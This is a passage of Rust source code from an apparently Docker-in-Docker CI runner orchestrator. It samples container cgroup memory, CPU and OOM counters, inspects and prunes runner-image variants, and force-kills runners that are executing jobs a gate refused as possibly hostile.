    *slot = Some(slot.map_or(reading, |high| high.max(reading)));
}

/// The cgroup v2 CFS controller's own stat file. Read the same way
/// [`LOCAL_EVENTS`] is, and for the same reason: `docker exec` is the access
/// path that works on macOS, where the cgroup filesystem lives inside the
/// Linux VM rather than on the host.
const CPU_STAT_PATH: &str = "/sys/fs/cgroup/cpu.stat";

/// `/proc/uptime`: VM-wide, not namespaced, so every container reads the same
/// clock. Read in the same `cat` as [`CPU_STAT_PATH`] — see [`read_cpu_stat`]
/// for why the timestamp has to come from inside that call.
const UPTIME_PATH: &str = "/proc/uptime";

/// Read a container's own `cpu.stat`, timestamped against `/proc/uptime` —
/// both in **one** `docker exec`, so the timestamp is read right next to the
/// counter it times rather than after the `docker` CLI call around it returns.
/// That distinction matters here specifically: under the CPU load this
/// measurement exists to catch, a single `docker exec` can take seconds to
/// minutes, and a timestamp taken on the caller's side afterwards
/// would fold that latency into the interval it is supposed to measure,
/// inflating `peak_mcpu` exactly when the load is real.
///
/// As best-effort as [`dind_counters`]'s read of the OOM counter: a failed
/// read (container not up yet, exited between polls, a transient error), or
/// one where either half fails to parse, just skips this sample rather than
/// failing the run. No fallback to a wall-clock timestamp on a missing
/// uptime — that would let a single [`CpuTally`] mix two different clocks.
async fn read_cpu_stat(name: &str) -> Option<(u64, CpuStat)> {
    let out = docker_output(
        &["exec", name, "cat", CPU_STAT_PATH, UPTIME_PATH],
        CLI_TIMEOUT,
    )
    .await
    .ok()
    .filter(|o| o.status.success())?;
    let text = String::from_utf8_lossy(&out.stdout);
    let stat = crate::cpu::parse_cpu_stat(&text)?;
    let at_us = crate::cpu::parse_uptime_usec(&text)?;
    Some((at_us, stat))
}

/// Poll the runner + dind memory and CPU every [`STATS_POLL`] while the job
/// runs, plus dind's own OOM tally. Memory and the OOM tally fold into a
/// high-water mark as each reading arrives (see [`latch`]); CPU instead feeds a
/// [`CpuTally`] per container, which needs the whole series — not a single
/// latched value — to report a rate (ADR-0019). Tolerant of misses throughout —
/// a failed read (container not up yet, transient error) just skips that
/// sample, on whichever of the two it hit.
///
/// `dind` is `None` for a profile that was granted no daemon: there is no second
/// container, so both dind readings (and `dind_cpu`) stay empty and the
/// per-class learner sees a job that genuinely used no dind memory rather than
/// one whose dind it failed to measure.
///
/// Returns as soon as `done` turns true — see [`sample_until`].
async fn sample_usage(runner: String, dind: Option<String>, done: watch::Receiver<bool>) -> Usage {
    sample_until(&DockerProbe { runner, dind }, done, STATS_POLL).await
}

/// One round of the readings [`sample_usage`] takes, folded into `usage` as each
/// one arrives. A trait only so [`sample_until`]'s timing can be tested without
/// a Docker daemon.
trait UsageProbe {
    fn round(&self, usage: &mut Usage) -> impl std::future::Future<Output = ()> + Send;
}

/// The real probe: `docker stats` and cgroup reads against the job's containers.
struct DockerProbe {
    runner: String,
    dind: Option<String>,
}

impl UsageProbe for DockerProbe {
    async fn round(&self, usage: &mut Usage) {
        let runner = &self.runner;
        if let Some(r) = stats_reading(runner).await {
            if let Some(m) = r.mem_mib {
                latch(&mut usage.runner_peak_mib, m);
            }
            if let Some(io) = r.io {
                latch_io(&mut usage.runner_io, io);
            }
        }
        if let Some(e) = mem_events(runner).await {
            latch_events(&mut usage.runner_events, e);
        }
        if let Some((at_us, stat)) = read_cpu_stat(runner).await {
            usage.runner_cpu.observe(at_us, stat);
        }
        if let Some(dind) = &self.dind {
            if let Some(r) = stats_reading(dind).await {
                if let Some(m) = r.mem_mib {
                    latch(&mut usage.dind_peak_mib, m);
                }
                if let Some(io) = r.io {
                    latch_io(&mut usage.dind_io, io);
                }
            }
            // Two orders of magnitude cheaper than the `stats` calls above (tens of
            // milliseconds against seconds each), so it rides along on their cadence
            // rather than justifying a poll loop of its own.
            let (tally, events) = dind_counters(dind).await;
            if let Some(tally) = tally {
                latch(&mut usage.dind_oom, tally);
            }
            if let Some(e) = events {
                latch_events(&mut usage.dind_events, e);
            }
            if let Some((at_us, stat)) = read_cpu_stat(dind).await {
                usage.dind_cpu.observe(at_us, stat);
            }
        }
    }
}

/// Run `probe` rounds `every` apart until `done` turns true (or its sender is
/// dropped), and return what they read.
///
/// `done` is raced against both the round and the pause between rounds, so the
/// sampler returns the moment the runner exits rather than up to a round plus a
/// pause later — a round is two `docker stats` calls (~2 s), the pause is
/// [`STATS_POLL`], and the caller holds the claim, its reservation and its
/// admission slot until this returns. A round cut short keeps every reading it
/// had already folded in; the call it was waiting on is dropped, and
/// [`docker_output`] kills its child on drop. Nothing is lost by not finishing
/// it: the runner has exited, so its cgroup — the thing being read — is gone.
async fn sample_until(
    probe: &impl UsageProbe,
    mut done: watch::Receiver<bool>,
    every: Duration,
) -> Usage {
    let mut usage = Usage::default();
    loop {
        tokio::select! {
            biased;
            _ = done.wait_for(|d| *d) => break,
            () = probe.round(&mut usage) => {}
        }
        tokio::select! {
            biased;
            _ = done.wait_for(|d| *d) => break,
            () = tokio::time::sleep(every) => {}
        }
    }
    usage
}

/// Whether a (still-present) container was OOM-killed, per Docker's own flag.
///
/// **Hierarchical, and therefore only correct for a container with no nested
/// cgroups.** Docker raises `.State.OOMKilled` off the container cgroup's
/// *aggregated* `memory.events`, which counts kills anywhere in the subtree, so a
/// container that supervises others latches the flag for kills that had nothing to
/// do with its own ceiling. It is used for the runner container only, which runs
/// its job's containers on the *dind* daemon over TCP and so has no descendant
/// cgroups at all — verified on a live runner: its processes sit directly in the
/// container's own cgroup, `cgroup.subtree_control` is empty and there are no child
/// cgroups, which makes hierarchical and local accounting the same reading.
///
/// dind is the opposite case and does not use this — see [`dind_counters`].
///
/// Best-effort: any failure to inspect reads as "not OOM".
async fn inspect_oom(name: &str) -> bool {
    docker_output(
        &["inspect", "-f", "{{.State.OOMKilled}}", name],
        CLI_TIMEOUT,
    )
    .await
    .ok()
    .filter(|o| o.status.success())
    .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "true")
    .unwrap_or(false)
}

/// The image content id (`sha256:…`) a container was created from.
///
/// Asked of the **container**, not of the tag faber passed to `docker run`. The
/// two can disagree — a tag is a mutable pointer, and by the time anyone reads the
/// audit log it may name different content entirely — and when they disagree, this
/// is the one that says what the job actually ran on.
///
/// Safe to call after the container has exited: faber creates runners without
/// `--rm` precisely so they survive to be inspected (see [`inspect_oom`]).
/// Best-effort: any failure reads as "unknown", never as an error the run inherits.
///
/// Recorded verbatim in the audit log, so anything that is not an image id as
/// Docker writes one also reads as "unknown" (#105).
async fn inspect_container_image(name: &str) -> Option<String> {
    docker_output(
        &["container", "inspect", "-f", "{{.Image}}", name],
        CLI_TIMEOUT,
    )
    .await
    .ok()
    .filter(|o| o.status.success())
    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
    .filter(|id| untrusted::image_id(id))
}

/// Whether the daemon answers at all — the cheapest liveness question there is,
/// and the one [`crate::host::revive_docker`] uses to decide whether a restart
/// actually worked. Deliberately not the availability probe: that runs a
/// container, which a daemon can fail while still being alive enough to answer.
pub(crate) async fn daemon_answers() -> bool {
    docker_ok(&["version", "--format", "{{.Server.Version}}"], CLI_TIMEOUT)
        .await
        .is_ok()
}

/// Run one `docker … prune` and hand back its output for the caller to read the
/// reclaimed total out of. The caller owns *which* prune — see
/// [`crate::host::reclaim_ci_disk`] for why only the narrow ones are ever run.
pub(crate) async fn prune(args: &[&str]) -> anyhow::Result<String> {
    let out = docker_output(args, TEARDOWN_TIMEOUT).await?;
    if !out.status.success() {
        anyhow::bail!("docker {}: {}", args.join(" "), stderr_of(&out));
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// The cgroup v2 file holding a cgroup's **own** memory events, as opposed to the
/// subtree-aggregated `memory.events` next to it. Read from inside the container,
/// where the cgroup namespace makes this path the container's own root.
const LOCAL_EVENTS: &str = "/sys/fs/cgroup/memory.events.local";

/// How many times the *dind container's own* memory ceiling produced an OOM, or
/// `None` when the counter could not be read.
///
/// # Why not `.State.OOMKilled`
///
/// faber runs docker-in-docker, so a job's service containers (a Postgres, a Redis)
/// are cgroup *descendants* of dind. When one of those is killed against **its own**
/// small limit, cgroup v2's hierarchical accounting propagates the event up and
/// Docker latches `OOMKilled=true` on dind — which was nowhere near its ceiling.
/// The learner reads that as "dind needs more memory" and force-bumps the class cap
/// by `OOM_BUMP × margin`, from a *censored* base that is itself the last bump, so
/// the error compounds: one live class's cap roughly doubled with every bump, to
/// several GiB within about an hour, against real dind peaks of a few hundred
/// MiB, and the inflated reservations parked every other claim.
/// `memory.events.local` exists precisely to separate a cgroup's own events from
/// its descendants'.
///
/// # Why the `oom` field and not `oom_kill`
///
/// `oom_kill` counts *victims belonging to this cgroup*, and dind has none: to
/// satisfy cgroup v2's no-internal-process rule the `docker:dind` entrypoint moves
/// dockerd and containerd into a child cgroup (`/init`) so it can delegate the
/// subtree to nested containers. dind's own cgroup root therefore holds zero
/// processes, and its local `oom_kill` is *structurally* always zero — a port
/// keying on it would report "no OOM" forever while looking like a fix.
///
/// `oom` is charged to the cgroup **whose limit was breached**, which is exactly
/// the question being asked. Measured in a Linux VM on cgroup v2, against a dind
/// capped like faber caps it:
///
/// | event | local `oom` | local `oom_kill` | `.State.OOMKilled` |
/// |---|---|---|---|
/// | nested container hits **its own** 32m limit | 0 | 0 | **true** (wrong) |
/// | dind hits **its own** 512m ceiling | **1** | 0 | true |
/// | *unlimited* nested container exhausts dind's ceiling (dind survives) | **several** | 0 | true |
/// | dind pinned at its ceiling, reclaim keeps up, nothing killed | 0 (`max` in the hundreds) | 0 | false |
///
/// The third row is the one that proves this is not a blind spot: a job's own
/// container, started without `--memory`, is bounded only by dind's ceiling, so
/// exhausting it *is* a dind OOM and must still bump dind's cap. Note its local
/// `oom_kill` is 0 — the victim was a descendant — so a port keying on `oom_kill`
/// would read zero for that row *and* the first, and could not tell a real dind
/// exhaustion from a misattributed one.
///
/// `oom_kill` is summed in anyway: it is the same event caught at the other end
/// (which cgroup lost a process, rather than which cgroup's limit broke), it cannot
/// be raised by a descendant, and the sum is only ever compared against zero — so a
/// container laid out flat, without dind's `/init` indirection, is covered too.
///
/// `max` is deliberately excluded: it counts the ceiling being *reached*, which
/// reclaim usually relieves without killing anything (thousands of such events in
/// one probe run that OOMed nothing), so it measures pressure, not failure. The
/// fourth row is why that matters in production: a real job sat at its ceiling
/// with `max` in the thousands and *zero* kills. Summing `max` would score it in
/// the thousands → `oom_dind` → `sample_for` censors to `cap × OOM_BUMP`, then
/// `cap_from` applies `margin` — a 2.25x force-bump on a job nothing ever killed,
/// re-arming the very ratchet this counter was adopted to stop, on a far commoner
/// trigger than the original.
///
/// dind's local OOM tally and hierarchical events in one `docker exec` (one fewer
/// per poll than reading each alone): both files, split by a marker line.
async fn dind_counters(name: &str) -> (Option<u64>, Option<MemEvents>) {
    let script = format!("cat {LOCAL_EVENTS}; echo {SPLIT}; cat {HIERARCHICAL_EVENTS}");
    let Some(out) = docker_output(&["exec", name, "sh", "-c", &script], CLI_TIMEOUT)
        .await
        .ok()
        .filter(|o| o.status.success())
    else {
        return (None, None);
    };
    split_dind_counters(&String::from_utf8_lossy(&out.stdout))
}

const SPLIT: &str = "@@faber-split@@";

fn split_dind_counters(text: &str) -> (Option<u64>, Option<MemEvents>) {
    let (local, hier) = text.split_once(SPLIT).unwrap_or((text, ""));
    (parse_local_oom(local), parse_mem_events(hier))
}

/// The cgroup v2 file holding a cgroup's memory events **aggregated over its
/// subtree** — the sibling of [`LOCAL_EVENTS`]. Read for ADR-0033 §5 only, to tell
/// a host OOM from a cap breach; never as a learner sample, which is how the
/// nested-container inflation that [`dind_counters`] documents came about.
const HIERARCHICAL_EVENTS: &str = "/sys/fs/cgroup/memory.events";

/// A container's hierarchical `memory.events` counters, or `None` when they could
/// not be read. Through `docker exec`, like [`dind_counters`]: it is the access
/// path that works on macOS (the cgroup filesystem is inside the Linux VM) and
/// on Linux alike, so no platform seam is needed. Only readable while the
/// container runs.
async fn mem_events(name: &str) -> Option<MemEvents> {
    let out = docker_output(&["exec", name, "cat", HIERARCHICAL_EVENTS], CLI_TIMEOUT)
        .await
        .ok()
        .filter(|o| o.status.success())?;
    parse_mem_events(&String::from_utf8_lossy(&out.stdout))
}

/// Parse `memory.events` into its `oom` and `oom_kill` counters. `None` unless both
/// are present and parse, so a truncated read or a kernel without them never
/// masquerades as a confident zero (which would read as "no host OOM").
fn parse_mem_events(text: &str) -> Option<MemEvents> {
    let (mut oom, mut oom_kill) = (None, None);
    for line in text.lines() {
        let mut field = line.split_whitespace();
        let (Some(key), Some(count)) = (field.next(), field.next()) else {
            continue;
        };
        match key {
            "oom" => oom = untrusted::number(count),
            "oom_kill" => oom_kill = untrusted::number(count),
            _ => {}
        }
    }
    Some(MemEvents {
        oom: oom?,
        oom_kill: oom_kill?,
    })
}

/// Parse `memory.events.local` (`"<key> <count>\n"` per line) into the cgroup's own
/// OOM tally. `None` when neither counter is present — a truncated read, cgroup v1,
/// or an error where the file's contents were expected — so "unavailable" never
/// masquerades as a confident zero.
fn parse_local_oom(text: &str) -> Option<u64> {
    let mut tally = None;
    for line in text.lines() {
        let mut field = line.split_whitespace();
        let (Some(key), Some(count)) = (field.next(), field.next()) else {
            continue;
        };
        if matches!(key, "oom" | "oom_kill") {
            if let Some(n) = untrusted::number(count) {
                // Saturating: the sum is only compared against zero, and a counter
                // read off a container must not be able to overflow it (#105).
                let sum = tally.get_or_insert(0u64);
                *sum = sum.saturating_add(n);
            }
        }
    }
    tally
}

/// Turn dind's latched OOM tally into the boolean the learner consumes.
///
/// # Fallback: an unreadable counter means "no OOM"
///
/// The counter is unavailable when dind has already exited (its cgroup goes with
/// it), and would also be on cgroup v1, an older kernel, or a non-Linux daemon. The
/// two candidate fallbacks are to trust `.State.OOMKilled` again or to fail closed,
/// and they fail in very different directions.
///
/// Falling back to the hierarchical flag reinstates the exact bug on the exact runs
/// that trigger it. The misattribution is *not* a rare accident: it fires whenever a
/// nested service container dies against its own limit, which for an E2E class is
/// close to every failing run, and each occurrence multiplies the class cap. A
/// wrong "yes" is unbounded and self-reinforcing — the bumped cap becomes the base
/// the next bump censors from.
///
/// Failing closed loses real signal, but the loss is bounded and largely covered
/// already, because the OOM censor is not the only way a cap grows:
///
/// - The peak sampler keeps running, and `cap = rolling-max(peaks) × margin` raises
///   the cap on measured growth regardless. A dind killed at its own ceiling is by
///   definition sitting at that ceiling when it dies — the last sample before death
///   in a probe run read just under the cap — so the ordinary rule still
///   raises the cap by roughly `margin`. The censored sample only ever added
///   `OOM_BUMP` on top.
/// - The unreadable case and the misattributed case barely overlap. A nested
///   container's OOM leaves dind *running*, so the counter is there to be read and
///   correctly says zero; dind's own OOM tends to kill dind, which is the case that
///   loses the counter. Failing closed therefore surrenders signal mostly where the
///   measured peak has already recorded it.
///
/// So: a wrong "yes" ratchets without limit and starves the budget; a wrong "no"
/// costs a slower climb on a path the peak sampler still covers. The asymmetry
/// decides it. It is logged rather than swallowed, so a host where the counter is
/// never readable shows up as a stream of warnings instead of a silent, permanent
/// "no dind ever OOMs".
fn dind_oom_verdict(dind: &str, tally: Option<u64>, postmortem: Option<bool>) -> bool {
    match tally {
        Some(tally) => tally > 0,
        None => match postmortem {
            // The counter is gone because the cgroup is gone: dind died mid-run.
            Some(true) => {
                warn!(
                    "dind {dind}: exited 137 with OOMKilled — its own memory ceiling, not a \
                     nested container's (the local counter died with the cgroup)"
                );
                true
            }
            _ => {
                warn!(
                    "dind {dind}: {LOCAL_EVENTS} was never readable this run — recording no dind OOM. \
                     The learner still sizes this class from its measured peak; see dind_counters."
                );
                false
            }
        },
    }
}

/// Whether a **stopped** dind was killed against its *own* ceiling, for the one
/// case [`dind_counters`] structurally cannot answer.
///
/// That counter is read from inside the container, so the case where dind itself
/// is the victim is exactly the case where it is unreadable — the cgroup is
/// destroyed with the container. Failing closed there loses the signal for a real
/// failure mode: a dind at the `MIN_CAP_MIB` floor is OOM-killed part-way through
/// the concurrent image pull that boots a job's service stack, and the job sees
/// only a truncated transfer followed by a host that no longer resolves. Nothing
/// in either log says "memory" (reproduced: a stack of service images pulled
/// concurrently kills a 256 MiB dind with `OOMKilled` and exit 137, and completes
/// with room to spare at 1024 MiB).
///
/// This is *not* the hierarchical `.State.OOMKilled` that
/// [`dind_counters`] documents as unusable, because it is qualified by the two
/// conditions that separate the cases:
///
/// - **Stopped.** A nested container dying against its own limit leaves dind
///   *running*, so the local counter is readable and correctly says zero — this
///   fallback is never consulted for it.
/// - **Exit 137.** A dind that merely inherited a descendant's latched flag and
///   then shut down normally exits 0; teardown's own `docker kill` exits 137 but
///   leaves `OOMKilled` false. Only dind's own kill sets both.
///
/// `None` when the daemon didn't answer, which a caller must not read as "no OOM
/// happened" any more than as "one did" — it falls through to the same warning the
/// unreadable counter already produced.
async fn died_of_own_oom(name: &str) -> Option<bool> {
    let out = docker_output(
        &[
            "inspect",
            "-f",
            "{{.State.Running}} {{.State.OOMKilled}} {{.State.ExitCode}}",
            name,
        ],
        CLI_TIMEOUT,
    )
    .await
    .ok()
    .filter(|o| o.status.success())?;
    own_oom_from_state(&String::from_utf8_lossy(&out.stdout))
}

/// Classify `"<Running> <OOMKilled> <ExitCode>"` into "did this container die
/// against its own memory ceiling?". `None` when the line isn't the three fields
/// expected — a truncated read is not an answer either way. See
/// [`died_of_own_oom`] for why all three fields are required.
fn own_oom_from_state(text: &str) -> Option<bool> {
    let mut field = text.split_whitespace();
    let state = (field.next()?, field.next()?, field.next()?);
    Some(state == ("false", "true", "137"))
}

/// Read a single image label via `docker inspect`, or `None` when the image is
/// absent, the label is unset, or the inspect fails. Best-effort like
/// [`inspect_oom`]: it never errors into the caller, so a drift check degrades to
/// "no baked truth" rather than a false signal. Docker prints `<no value>` for an
/// absent label (and an empty string for an empty one); both read as `None`.
pub async fn inspect_label(image: &str, key: &str) -> Option<String> {
    let format = format!("{{{{ index .Config.Labels {key:?} }}}}");
    let out = docker_output(&["inspect", "-f", &format, image], CLI_TIMEOUT)
        .await
        .ok()
        .filter(|o| o.status.success())?;
    let value = String::from_utf8_lossy(&out.stdout).trim().to_string();
    (!value.is_empty() && value != "<no value>").then_some(value)
}

// --- runner-image variants (ADR-0008) --------------------------------------

/// What a variant build reads off its base image (ADR-0008).
///
/// Parsed from `{{json .Id}}` and `{{json .Config}}` rather than read through field
/// templates such as `{{ .Config.User }}`. A daemon that renders `.Config` as a map
/// (Docker 29 with its containerd image store does) fails such a template outright
/// on an image that declares no user, and that failure cannot be told apart from a
/// daemon that did not answer. The JSON always parses, and an absent `User` is
/// simply absent.
#[derive(Debug, Deserialize)]
struct ImageFacts {
    #[serde(rename = "Id")]
    id: String,
    #[serde(rename = "Config", default)]
    config: Option<ImageConfig>,
}

/// The one field of an image's config faber reads.
#[derive(Debug, Default, Deserialize)]
struct ImageConfig {
    #[serde(rename = "User", default)]
    user: String,
}

const IMAGE_FACTS_FORMAT: &str = r#"{"Id":{{json .Id}},"Config":{{json .Config}}}"#;

/// The facts for `image`, or the reason there are none: absent, unreadable, or not
/// the JSON faber asked for.
async fn image_facts(image: &str) -> anyhow::Result<ImageFacts> {
    let text = docker_stdout(
        &["image", "inspect", "--format", IMAGE_FACTS_FORMAT, image],
        CLI_TIMEOUT,
        untrusted::OUTPUT_CAP,
    )
    .await?;
    serde_json::from_str(text.trim()).map_err(|e| {
        anyhow::anyhow!(
            "inspecting image {image}: not the JSON faber asked for ({})",
            untrusted::for_log(&e.to_string(), 160)
        )
    })
}

/// The base image's content id (`sha256:…`), which is what a variant tag is keyed
/// on. Keying on the base's *tag* instead would let a variant built against a
/// superseded base keep serving jobs after the base was rebuilt — silently, and
/// for as long as the tag lived. See ADR-0008.
///
/// `None` when the image is absent or unreadable, and when the daemon answers
/// with something that is not an image id: it becomes part of a tag and a label,
/// so it is held to the form Docker writes (#105). Best-effort in the same way
/// [`inspect_label`] is: a caller degrades to "can't resolve a variant" and runs
/// the base, never to a wrong answer.
pub(crate) async fn image_id(image: &str) -> Option<String> {
    match image_facts(image).await {
        Ok(facts) if untrusted::image_id(&facts.id) => Some(facts.id),
        Ok(facts) => {
            warn!(
                "image {image}: the daemon reports id {:?}, which is not an image id",
                untrusted::for_log(&facts.id, 80)
            );
            None
        }
        Err(e) => {
            debug!("image {image}: {e}");
            None
        }
    }
}

/// The user an image runs as, `root` when it declares none.
///
/// The variant build has to become root to install system dependencies, and must
/// hand the image back exactly as it found it: a runner image that suddenly runs
/// as root is a different image in the way that matters most.
///
/// An error, not `root`, when the image cannot be read, or declares a user that is
/// not a Docker `USER` value. The user reaches the build as `${BASE_USER}`, and an
/// operator's own recipe may expand that in a `RUN` line, which a shell runs, so
/// only a value in a `USER`'s own alphabet is passed on (#105). Defaulting to root
/// on either would build the different image above, so the caller builds nothing
/// and runs the base instead.
pub(crate) async fn image_user(image: &str) -> anyhow::Result<String> {
    let facts = image_facts(image).await?;
    user_of(facts.config.unwrap_or_default())
        .map_err(|why| anyhow::anyhow!("base image {image}: {why}"))
}

/// The `USER` a variant hands its image back with: `root` for none declared, the
/// declared one when it is a Docker `USER` value, an error otherwise.
fn user_of(config: ImageConfig) -> Result<String, String> {
    let user = config.user.trim();
    if user.is_empty() {
        return Ok("root".to_string());
    }
    if untrusted::user_spec(user) {
        Ok(user.to_string())
    } else {
        Err(format!(
            "declares USER {:?}, which is not a user faber passes to a build",
            untrusted::for_log(user, 80)
        ))
    }
}

/// Whether an image is present locally. Answered by an inspect rather than a
/// listing so it costs one metadata call whatever the daemon holds.
pub(crate) async fn image_exists(image: &str) -> bool {
    docker_output(&["image", "inspect", "-f", "{{ .Id }}", image], CLI_TIMEOUT)
        .await
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// What the daemon says about one image being on this host (#63).
///
/// Three answers, not two: [`image_exists`] folds "the daemon did not answer"
/// into "absent", which is fine for a variant faber can rebuild and wrong for a
/// check that stops minting. Only the daemon's own "No such image" is
/// [`ImagePresence::Absent`]; anything else it cannot vouch for is `Unknown`, and
/// `Unknown` never stops a runner.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ImagePresence {
    Present,
    Absent,
    Unknown(String),
}

/// Ask the daemon whether `image` is present. See [`ImagePresence`].
pub(crate) async fn image_presence(image: &str) -> ImagePresence {
    if !untrusted::image_ref(image) {
        return ImagePresence::Unknown(format!(
            "{:?} is not an image reference faber passes to docker",
            untrusted::for_log(image, 80)
        ));
    }
    match docker_output(&["image", "inspect", "-f", "{{ .Id }}", image], CLI_TIMEOUT).await {
        Ok(out) => presence_of(
            out.status.success(),
            &String::from_utf8_lossy(&out.stdout),
            &stderr_of(&out),
        ),
        Err(e) => ImagePresence::Unknown(e.to_string()),
    }
}

/// [`image_presence`]'s reading of one inspect, pure. A success must print an
/// image id in the form Docker writes one (#105), and a failure counts as absence
/// only when the daemon said so in its own words.
fn presence_of(ok: bool, stdout: &str, stderr: &str) -> ImagePresence {
    if ok {
        let id = stdout.trim();
        return if untrusted::image_id(id) {
            ImagePresence::Present
        } else {
            ImagePresence::Unknown(format!(
                "image inspect printed {:?}, not an image id",
                untrusted::for_log(id, 80)
            ))
        };
    }
    if stderr.contains("No such image") {
        ImagePresence::Absent
    } else {
        ImagePresence::Unknown(stderr.to_string())
    }
}

/// Cap on pulling a profile's image that is absent locally. A pull moves data, so
/// it gets far more than [`CLI_TIMEOUT`]; past it the pull is abandoned as
/// inconclusive, and a later cycle tries again.
const PULL_TIMEOUT: Duration = Duration::from_secs(15 * 60);

/// Pull `image` — what `docker run` does by itself for an image that is not
/// local, done ahead of registering a runner instead (#63). `Ok(())` when the
/// pull succeeded, `Err` with the daemon's reason otherwise. Whether the image is
/// then present is for [`image_presence`] to say, not this.
pub(crate) async fn pull_image(image: &str) -> Result<(), String> {
    if !untrusted::image_ref(image) {
        return Err("not an image reference faber passes to docker".to_string());
    }
    match docker_output(&["pull", "--quiet", image], PULL_TIMEOUT).await {
        Ok(out) if out.status.success() => Ok(()),
        Ok(out) => Err(stderr_of(&out)),
        Err(e) => Err(e.to_string()),
    }
}

/// Tags of the runner-image variants faber built, newest first.
///
/// Filtered on `org.faber.kind=image`, which nothing but a faber-built variant
/// carries — emphatically not the operator's base image, which exists on this
/// builder and in no registry and must never be reaped (AGENTS.md, ADR-0007).
pub(crate) async fn variant_tags() -> anyhow::Result<Vec<String>> {
    docker_lines(&variant_ls_args(), CLI_TIMEOUT)
        .await
        .map(|lines| image_refs(lines, "image: variant listing"))
}

/// The tags in an `image ls` listing that are references faber may put on a
/// command line (#105). A dangling `<none>` row is no tag at all and is dropped
/// without a word; anything else outside a reference's alphabet is skipped with a
/// warning. Every caller removes only what this keeps, so a skip removes less.
fn image_refs(lines: Vec<String>, what: &str) -> Vec<String> {
    untrusted::accept(lines, what, |tag| {
        if tag.contains("<none>") {
            Ok(None)
        } else if untrusted::image_ref(&tag) {
            Ok(Some(tag))
        } else {
            Err("a tag is not an image reference")
        }
    })
}

/// The volume names in a listing that are names Docker itself allows (#105).
/// Every caller removes only what this keeps.
fn volume_names(lines: Vec<String>, what: &str) -> Vec<String> {
    untrusted::accept(lines, what, |name| {
        if untrusted::object_name(&name) {
            Ok(Some(name))
        } else {
            Err("a volume name is outside Docker's own alphabet")
        }
    })
}

/// The listing that decides which images faber may remove.
///
/// The `org.faber.kind=image` filter is the whole safety property, so it is an
/// argv builder with a test on it rather than a string inline in a call. Nothing
/// but a variant faber built carries that label — least of all the operator's
/// base image, which carries no faber labels at all and which faber must never
/// remove: it exists on this builder and in no registry, so one `docker rmi`
/// would take CI down with nothing to re-pull.
fn variant_ls_args() -> Vec<String> {
    vec![
        "image".into(),
        "ls".into(),
        "--filter".into(),
        format!("label={LABEL_KIND}={KIND_IMAGE}"),
        "--format".into(),
        "{{ .Repository }}:{{ .Tag }}".into(),
    ]
}

/// The images every running container is using, so eviction never removes one out
/// from under a live job. `docker rmi` would refuse it anyway; knowing first is
/// what keeps that from being reported as a failure.
///
/// An error when Docker cannot be read, which the caller must answer by removing
/// nothing this pass. It used to read as an empty set, so a listing that failed
/// shielded nothing (#105). A row that is not an image reference is dropped: it
/// can equal no tag faber would remove, so dropping it shields nothing less.
pub(crate) async fn images_in_use() -> anyhow::Result<HashSet<String>> {
    let lines = docker_lines(&["ps", "--format", "{{ .Image }}"], CLI_TIMEOUT).await?;
    Ok(lines
        .into_iter()
        .filter(|r| untrusted::image_ref(r))
        .collect())
}

/// Remove one faber-built variant. `Ok(false)` = already gone, which is success:
/// the janitor and a concurrent teardown may both reach the same stale tag.
pub(crate) async fn remove_image(tag: &str) -> anyhow::Result<bool> {
    docker_rm(&["image", "rm", tag]).await
}

// --- gate-bypass enforcement (ADR-0030) -----------------------------------------
//
// Two removals that exist nowhere else in faber, each reached only from an
// enforced *trust* bypass: a job the gate refuses as possibly hostile ran on a
// runner this host minted. Neither is a general-purpose path, and neither should
// become one.

/// Kill a runner's containers **without asking the runner** (ADR-0030, ADR-0059 §4).
///
/// Every other kill of a live runner goes through [`reclaim_clearance`]
/// (ADR-0017): it refuses while a job is executing, because the job it would abort
/// is legitimate work. This one exists precisely for the job that is executing —
/// a job the gate refuses as possibly hostile, which took a runner minted for
/// another, or one refused when it started. ADR-0017 protects legitimate work,
/// and this is not. The provision task watching the runner sees it exit and tears
/// the sandbox down as for any other exit.
///
/// The runner first, then its dind, where the job's own containers live — the
/// dind whatever happened to the runner, since a runner that already exited may
/// have left the job's containers running. A container that is absent or no
/// longer running is already where the kill would put it.
///
/// Retried until the runner is gone (ADR-0059 §4: "retrying until the runner is
/// gone"), up to [`FORCE_KILL_TRIES`] times here. Gone is read back from Docker,
/// not inferred from `docker kill` answering: a kill the daemon accepted but did
/// not carry out is the case the retry is for. An error when the runner is still
/// running after the last try; the caller keeps it and tries again on its next
/// pass, because a runner that outlives this is still executing a refused job.
pub(crate) async fn force_kill_runner(runner_name: &str) -> anyhow::Result<()> {
    let names = Names::for_runner(runner_name);
    let mut last = None;
    for attempt in 1..=FORCE_KILL_TRIES {
        let runner = docker_rm(&["kill", &names.runner])
            .await
            .map(|_| ())
            .map_err(|e| e.to_string());
        let dind = docker_rm(&["kill", &names.dind])
            .await
            .map(|_| ())
            .map_err(|e| e.to_string());
        let verdict = kill_verdict(&names, runner, dind);
        // Gone means Docker says it is not running, or not there at all. An
        // unreadable answer is not gone.
        if verdict.is_ok() && container_running(&names.runner).await == Some(false) {
            return Ok(());
        }
        last = Some(match verdict {
            Ok(()) => anyhow::anyhow!("{} is still running after the kill", names.runner),
            Err(e) => e,
        });
        if attempt < FORCE_KILL_TRIES {
            tokio::time::sleep(FORCE_KILL_BACKOFF * attempt).await;
        }
    }
    Err(last.unwrap_or_else(|| anyhow::anyhow!("killing {} did not run", names.runner)))
}

/// How many times [`force_kill_runner`] tries before it hands the runner back to
/// its caller's next pass.
const FORCE_KILL_TRIES: u32 = 4;

/// The pause between two of [`force_kill_runner`]'s tries, times the try number.
const FORCE_KILL_BACKOFF: Duration = Duration::from_millis(500);

/// Whether a failed `docker kill` only says the container is already stopped.
fn kill_moot(err: &str) -> bool {
    let e = err.to_lowercase();
    e.contains("is not running") || e.contains("no such container")
}

/// [`force_kill_runner`]'s result from the two kills.
///
/// The runner's kill decides it. A runner whose kill failed is still executing a
/// refused job, whatever happened to its dind, so that is an error (#66: it used
/// to read as done when the dind's kill worked, and nothing tried again). A dind
/// whose kill alone failed is logged: the runner, which ran the job's steps, is
/// stopped, and teardown removes the dind with the sandbox.
fn kill_verdict(
    names: &Names,
    runner: Result<(), String>,
    dind: Result<(), String>,
) -> anyhow::Result<()> {
    let runner = runner.or_else(|e| if kill_moot(&e) { Ok(()) } else { Err(e) });
    let dind = dind.or_else(|e| if kill_moot(&e) { Ok(()) } else { Err(e) });
